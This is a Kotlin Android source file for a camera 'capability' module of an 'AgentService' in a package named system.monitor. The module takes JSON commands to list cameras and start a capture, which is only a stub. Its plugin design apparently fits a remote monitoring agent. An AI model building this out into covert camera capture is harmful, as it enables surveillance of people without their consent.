package com.system.monitor.capabilities

import android.content.Context
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraCharacteristics
import com.google.gson.Gson
import com.system.monitor.AgentService

class CameraCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "capture" -> capturePhoto(params.camera ?: 0)
            "list" -> listCameras()
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    private fun listCameras(): Map<String, Any> {
        val cm = service.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraIds = cm.cameraIdList
            val cameras = mutableListOf<Map<String, Any>>()
            for (id in cameraIds) {
                val characteristics = cm.getCameraCharacteristics(id)
                val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                cameras.add(mapOf<String, Any>(
                    "id" to id,
                    "facing" to when (facing) {
                        CameraCharacteristics.LENS_FACING_FRONT -> "front"
                        CameraCharacteristics.LENS_FACING_BACK -> "back"
                        else -> "external"
                    }
                ))
            }
            return mapOf<String, Any>("cameras" to cameras)
        } catch (e: CameraAccessException) {
            return mapOf<String, Any>("error" to e.message ?: "camera_access_error")
        }
    }

    private fun capturePhoto(cameraId: Int): Map<String, Any> {
        val cm = service.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraIds = cm.cameraIdList
        if (cameraId >= cameraIds.size) {
            return mapOf<String, Any>("error" to "invalid_camera_id")
        }
        val id = cameraIds[cameraId]
        return mapOf<String, Any>("status" to "camera_capture_initiated", "camera_id" to id)
    }

    data class Params(val action: String, val camera: Int? = null)
}